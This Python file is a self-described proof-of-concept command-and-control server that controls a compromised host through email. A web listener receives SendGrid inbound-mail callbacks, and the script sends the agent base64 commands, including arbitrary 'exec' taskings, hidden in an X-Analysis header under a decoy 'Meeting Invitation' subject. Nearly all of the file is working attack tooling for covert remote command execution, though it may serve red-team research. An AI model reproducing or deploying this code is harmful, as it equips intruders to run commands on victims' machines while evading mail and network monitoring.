import sys, os, re
import cmd
import time
import sendgrid
import bottle
import threading
import base64


FROM_EMAIL  = 'mail@<domain.com>'
HEADER      = 'X-Analysis'
SG_API_KEY  = '<SendGrid API Key>'


SG = sendgrid.SendGridAPIClient(SG_API_KEY)
Agent = None
Waiting = False

def bail():
    print('\n\n[+] Goodbye.')
    os._exit(0)

### Callback Handling

@bottle.post('/inbox')
def callback():
    global Agent
    global Waiting

    print(bottle.request.body.read())
    
    source = bottle.request.forms.get('from')
    headers = bottle.request.forms.get('headers')
    sender = bottle.request.forms.get('sender_ip')

    if not source or not headers or not sender:
        print('[!] Bad callback request!')
        return
    
    if '<' in source: # Remove text from name... shame
        source = source[source.find('<') + 1 : -1]

    if not Agent:
        print('\n[+] New agent from {} [{}]'.format(source, sender))
        Agent = source

    if source != Agent:
        print('\n[-] New agent from {} [{}], but we already have {}'.format(source, sender, Agent))
        return

    # Headers get lowercased by EWS **
    match = re.findall(r'{}: (.+)'.format(HEADER.lower()), headers)

    if not match:
        print('[-] Beacon from {}. {} was not found!'.format(Agent, HEADER))
        return

    cb_data = match[0]
    Waiting = False

    # Special processing for long lines
    if 'us-ascii' in match[0]:
        cb_data = ''.join([s.replace('=?us-ascii?Q?','')[:-2] for s in cb_data.split(' ')])
    
    if not cb_data:
        print('\n\n[+] Beacon from {}:\n'.format(Agent))
        return

    try:
        cb_data = base64.b64decode(cb_data).decode()

        if 'HELLO' == cb_data:
            return

        print('\n' + cb_data)
    except:
        print(cb_data)

    return

http_server = threading.Thread(
    target = bottle.run,
    kwargs = {'host' : '0.0.0.0', 'port' : 80, 'quiet' : True}
)

# / Callback Handling

def send_tasking(mailbox, tasking):
    global Waiting

    tasking = tasking.encode() if isinstance(tasking, str) else tasking
    b64_data = base64.b64encode(tasking).decode()
    tasking_header = sendgrid.helpers.mail.Header(HEADER, b64_data)

    message = sendgrid.helpers.mail.Mail(
        from_email = FROM_EMAIL,
        to_emails = mailbox,
        subject = 'Meeting Invitation',
        plain_text_content = 'Please give me a call regarding that meeting'
    )

    message.add_header(tasking_header)

    try:
        response = SG.send(message)
        Waiting = True
    except Exception as e:
        print(str(e))

class Shell(cmd.Cmd):
    prompt = '# '
    ruler = None

    def __init__(self):
        cmd.Cmd.__init__(self)

    def do_exit(self, arg):
        'Exit the shell'
        return True

    def do_getuid(self, arg):
        'Get current username'
        send_tasking(Agent, 'getuid|')

    do_whoami = do_getuid

    def do_exec(self, arg):
        'Execute a command'
        send_tasking(Agent, 'exec|' + arg)

    # Boilerplate

    def postcmd(self, stop, line):
        global Agent
        global Waiting

        while Waiting:
            time.sleep(.25)

        self.prompt = '\n'
        if Agent: self.prompt += '{} # '.format(Agent)
        else: self.prompt += '# '

        return stop

    def precmd(self, line):
        global Agent
        
        if line and not Agent and line not in ['help', 'exit']:
            print('\n[!] No agent is connected\n')
            return ''

        return line
    
    def default(self, command):
        print("\n[-] Command does not exist")
        return
        
    def completedefault(self, text, line, begidx, endidx):
        return
    
    def do_EOF(self, command):
        logging.print('')
        return False


print("""
 _____         _   _____ ___ ___ _         
|  _  |___ ___| |_|     |  _|  _|_|___ ___ 
|   __| . |_ -|  _|  |  |  _|  _| |  _| -_|
|__|  |___|___|_| |_____|_| |_| |_|___|___|
        EWS Mail C2 - Proof of Concept
""")


http_thread = threading.Thread(
    target = bottle.run, kwargs = {
    'host' : '0.0.0.0',
    'port' : 80,
    'quiet' : True
})
http_thread.start()

#bottle.run(host='0.0.0.0', port=80, quiet=True)

try:
    shell = Shell()
    shell.cmdloop()
except KeyboardInterrupt:
    bail()

bail()